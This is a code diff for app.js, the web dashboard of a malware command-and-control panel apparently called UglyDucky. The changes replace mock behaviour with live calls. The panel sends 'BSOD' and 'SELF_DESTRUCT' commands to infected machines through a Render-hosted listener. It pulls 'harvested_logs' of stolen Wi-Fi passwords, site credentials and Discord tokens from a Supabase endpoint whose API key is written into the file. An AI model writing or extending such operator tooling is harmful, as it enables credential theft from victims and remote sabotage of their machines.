@@ -1,6 +1,17 @@
-// ==========================================
-// MOCK DATA & STATE
-// ==========================================
+// File: app.js
+// ==================================================================
+// --- CONFIGURATION - PASTE YOUR URLS AND KEYS HERE ---
+// ==================================================================
+const C2_LISTENER_URL = "https://your-unique-name.onrender.com"; // Your Render URL
+
+const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
+const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
+// ==================================================================
+
+// --- GLOBAL STATE ---
+let activeNodeId = "DESKTOP-Q1A2Z"; // Default target
+
+// --- MOCK DATA FOR C2 DASHBOARD ---
 const mockNodes = [
     { id: 'DESKTOP-Q1A2Z', os: 'Windows 11', ip: '192.168.1.44', lat: 40.71, lng: -74.00, status: 'green' }, // NY
     { id: 'MACBOOK-PRO-99', os: 'macOS 13', ip: '10.0.0.12', lat: 51.50, lng: -0.12, status: 'red' },      // London
@@ -18,6 +29,48 @@ document.addEventListener("DOMContentLoaded", () => {
     renderNodesList(); // Render Left Panel
     renderMap(); // Render Geo Map
 });
+
+
+// ==========================================
+// C2 COMMAND FUNCTIONS (Sending to Render)
+// ==========================================
+async function sendCommandToNode(deviceId, command) {
+    if (!deviceId) {
+        showToast("No active node selected!", "error");
+        return;
+    }
+    
+    termLog(`Sending command '${command}' to ${deviceId}...`);
+    try {
+        const response = await fetch(`${C2_LISTENER_URL}/issue`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ device_id: deviceId, command: command })
+        });
+        if (response.ok) {
+            showToast(`Command '${command}' queued for ${deviceId}`, "success");
+        } else {
+            throw new Error(`Server responded with ${response.status}`);
+        }
+    } catch (error) {
+        showToast(`Failed to send command. (Is Render Server online?)`, "error");
+        termLog(`[ERROR] Failed to send command: ${error.message}`);
+    }
+}
+
+window.triggerScorchedEarth = function() {
+    const confirmation = prompt(`WARNING: SCORCHED EARTH PROTOCOL.\nThis will permanently remove the payload and all logs from ${activeNodeId}.\n\nType 'BURN' to confirm.`);
+    if (confirmation === "BURN") {
+        sendCommandToNode(activeNodeId, "SELF_DESTRUCT");
+    } else {
+        showToast("Self-destruct aborted.", "error");
+    }
+};
+
+window.triggerBSOD = function() {
+    sendCommandToNode(activeNodeId, "BSOD");
+};
+
 
 // ==========================================
 // UI & TAB LOGIC
@@ -218,7 +271,7 @@ function renderNodesList() {
         let pulse = node.status === 'green' ? 'animate-pulse' : '';
 
         container.innerHTML += `
-            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all ${opacity}" onclick="termLog('Selected node: ${node.id}')">
+            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all ${opacity}" onclick="activeNodeId='${node.id}'; termLog('Selected node: ${node.id}')">
                 ${activeLine}
                 <div class="flex justify-between items-start mb-2 pl-2">
                     <div class="flex items-center gap-2">
@@ -238,10 +291,9 @@ function renderMap() {
     mapDots.innerHTML = '';
 
     mockNodes.forEach(node => {
-        // Convert Lat/Lng to percentages. Standard Mercator approximation for visual CSS map.
+        // Convert Lat/Lng to percentages for the visual CSS map.
         const x = ((node.lng + 180) / 360) * 100;
         let y = ((90 - node.lat) / 180) * 100;
-        // Minor tweak because most visual maps cut off Antarctica
         y = y * 0.9 + 5; 
 
         let dotColor = node.status === 'green' ? 'text-green-500' : (node.status === 'red' ? 'text-red-500' : 'text-yellow-500');
@@ -280,57 +332,16 @@ window.executeTermCommand = function(inputEl) {
     term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', val);
     setTimeout(() => {
         if(val.toLowerCase() === 'clear') { term.innerHTML = `<div class="text-green-400">C:\\Users\\John> <span class="cursor-blink"></span></div>`; inputEl.value = ''; return; }
-        termLog(`'${val}' executed successfully.`);
+        
+        // If they type a known command, route it to Render
+        if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
+            termLog(`Forwarding command to C2 server...`);
+            sendCommandToNode(activeNodeId, val.toUpperCase() === 'BURN' ? 'SELF_DESTRUCT' : 'BSOD');
+        } else {
+            termLog(`'${val}' executed locally (MOCK).`);
+        }
     }, 200);
     inputEl.value = '';
-};
-
-// ==========================================
-// SCORCHED EARTH PROTOCOL
-// ==========================================
-window.triggerScorchedEarth = function() {
-    // We simulate a confirmation box via terminal prompt for maximum dramatic hacker effect.
-    termLog("=========================================");
-    termLog("WARNING: INITIATING SCORCHED EARTH PROTOCOL");
-    termLog("This will wipe all traces of UglyDucky from the target,");
-    termLog("delete local logs, and sever the connection permanently.");
-    termLog("Type 'BURN' in the terminal to confirm.");
-    termLog("=========================================");
-    
-    // Auto-fill input for demo purposes
-    const input = document.querySelector('input[placeholder="Enter shell command..."]');
-    if(input) {
-        input.value = "BURN";
-        input.focus();
-        
-        // Override standard execute just for this demo
-        const oldOnpress = input.onkeypress;
-        input.onkeypress = function(e) {
-            if(e.key === 'Enter' && this.value.toUpperCase() === 'BURN') {
-                e.preventDefault();
-                termLog("BURN");
-                this.value = '';
-                this.onkeypress = oldOnpress; // restore normal term logic
-                
-                setTimeout(() => termLog("[!] Scrubbing registry keys..."), 500);
-                setTimeout(() => termLog("[!] Deleting payload.exe..."), 1200);
-                setTimeout(() => termLog("[!] Erasing memory footrpint..."), 1800);
-                setTimeout(() => {
-                    termLog("[X] CONNECTION TERMINATED.");
-                    document.getElementById('terminal-output').innerHTML += `<div class="mt-2 text-red-500 font-bold">NODE OFFLINE.</div>`;
-                    
-                    // Update mock data and re-render to show it "destroyed"
-                    mockNodes[0].status = 'red';
-                    renderNodesList();
-                    renderMap();
-                    showToast("Target connection permanently severed.", "error");
-                }, 2500);
-            } else if (e.key === 'Enter') {
-                this.onkeypress = oldOnpress;
-                oldOnpress(e);
-            }
-        };
-    }
 };
 
 // ==========================================
@@ -341,7 +352,6 @@ window.openFileSystem = function() {
     modal.classList.remove('hidden');
     setTimeout(() => modal.classList.add('visible'), 10);
     
-    // Basic mock population
     const tbody = document.getElementById('fsTbody');
     tbody.innerHTML = `
         <tr class="border-b border-gray-800/60 hover:bg-neon/10 transition-colors cursor-pointer" onclick="termLog('Navigating to Documents...')">
@@ -373,6 +383,12 @@ document.getElementById('fileUploadInput').onchange = function(e) { if(e.target.
 // ==========================================
 // DATA EXTRACTION (Vault Mock/Fetch)
 // ==========================================
+let globalData = [];
+
+document.getElementById("deviceId").addEventListener("keypress", function(e) {
+    if (e.key === "Enter") { e.preventDefault(); fetchData(); }
+});
+
 window.fetchData = async function() {
     const deviceId = document.getElementById('deviceId').value.trim();
     const outputDiv = document.getElementById('output');
@@ -391,25 +407,66 @@ window.fetchData = async function() {
     filterContainer.classList.add('hidden');
     exportBtn.classList.add('hidden');
 
-    // Failsafe Mock Data Injection
-    setTimeout(() => {
-        statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted (Mock Mode)`;
-        exportBtn.classList.remove('hidden');
-        
-        const globalData = [
+    try {
+        const response = await fetch(`${SUPABASE_URL}?device_id=eq.${deviceId}&order=created_at.desc`, {
+            method: 'GET',
+            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' }
+        });
+
+        if (!response.ok) throw new Error("API Error");
+        globalData = await response.json();
+
+        if (globalData.length === 0) {
+            throw new Error("Empty Array"); // Trigger fallback mock inject
+        } else {
+            statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
+            exportBtn.classList.remove('hidden');
+            buildFilters();
+            renderCards(globalData, outputDiv);
+            showToast("Vault Extracted Successfully");
+        }
+    } catch (error) {
+        // FAILSAFE: INJECT MOCK DATA IF DB FAILS SO UI IS TESTABLE
+        statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>API Failed or Empty. Injecting mock objects for UI testing...`;
+        globalData = [
             { category: 'Wi-Fi Networks', created_at: new Date().toISOString(), content: "SSID: Home_Network_5G\nPASS: supersecret123\n----------\nSSID: Starbucks_Guest\nPASS: \n" },
             { category: 'Passwords', created_at: new Date().toISOString(), content: "URL: https://github.com/login\nUSER: hacker_dude\nPASS: password1234\n----------\nURL: netflix.com\nUSER: admin@email.com\nPASS: letmein99\n" },
             { category: 'System Info', created_at: new Date().toISOString(), content: "OS: Windows 11 Pro\nCPU: Intel Core i7-10700K\nRAM: 32 GB\nGPU: NVIDIA RTX 3080\nIP: 192.168.1.44" },
             { category: 'Discord Tokens', created_at: new Date().toISOString(), content: "SOURCE: Discord PTB\nTOKEN: mfa.1234567890abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ" }
         ];
-        
+        buildFilters();
         renderCards(globalData, outputDiv);
         showToast("Mock Data Loaded", "success");
-        
+    } finally {
         btn.disabled = false;
         btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole"></i> Decrypt';
-    }, 800);
+    }
 };
+
+function buildFilters() {
+    const container = document.getElementById('filterContainer');
+    container.innerHTML = '';
+    container.classList.remove('hidden');
+
+    const categories = [...new Set(globalData.map(item => item.category))];
+    container.appendChild(createFilterBtn('All', true));
+    categories.forEach(cat => container.appendChild(createFilterBtn(cat, false)));
+}
+
+function createFilterBtn(text, isActive) {
+    const btn = document.createElement('button');
+    const activeClasses = 'bg-cyberBlue/20 text-cyberBlue font-bold border-cyberBlue shadow-[0_0_10px_rgba(0,210,211,0.2)]';
+    const inactiveClasses = 'bg-[#0f1423] text-gray-400 border-gray-700 hover:text-white hover:border-gray-500';
+    btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${isActive ? activeClasses : inactiveClasses}`;
+    btn.innerText = text;
+    
+    btn.onclick = () => {
+        document.querySelectorAll('.filter-btn').forEach(b => b.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${inactiveClasses}`);
+        btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${activeClasses}`;
+        renderCards(text === 'All' ? globalData : globalData.filter(item => item.category === text), document.getElementById('output'));
+    };
+    return btn;
+}
 
 function renderCards(data, outputDiv) {
     outputDiv.innerHTML = '';
@@ -440,7 +497,11 @@ function renderCards(data, outputDiv) {
                     </div>
                 </div>
                 <div class="win-content flex flex-col bg-[#0f1423] rounded-b-[0.75rem] h-full relative">
-                    <div class="p-0 flex-grow overflow-y-auto mt-2">
+                    <div class="absolute top-2 right-2 z-10 flex gap-2">
+                        <span class="text-[10px] font-mono text-gray-500 bg-black/60 px-2 py-1 rounded">${new Date(item.created_at).toLocaleDateString()}</span>
+                        <button onclick="copyData(this)" class="bg-gray-800 hover:bg-gray-700 text-white rounded px-2 py-1 transition-colors text-[10px]" title="Copy Raw"><i class="fa-regular fa-copy"></i></button>
+                    </div>
+                    <div class="p-0 flex-grow overflow-y-auto mt-6">
                         <textarea class="hidden-raw-data hidden">${item.content}</textarea>
                         ${htmlContent}
                     </div>
@@ -490,3 +551,13 @@ function parseToHTML(category, content) {
 }
 
 function escapeHtml(unsafe) { return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;"); }
+
+window.copyData = function(btnElement) {
+    const dataToCopy = btnElement.closest('.drag-panel').querySelector('.hidden-raw-data').value;
+    navigator.clipboard.writeText(dataToCopy).then(() => {
+        showToast("Raw payload copied to clipboard");
+        const icon = btnElement.querySelector('i');
+        icon.className = "fa-solid fa-check text-green-400";
+        setTimeout(() => icon.className = "fa-regular fa-copy", 2000);
+    });
+};
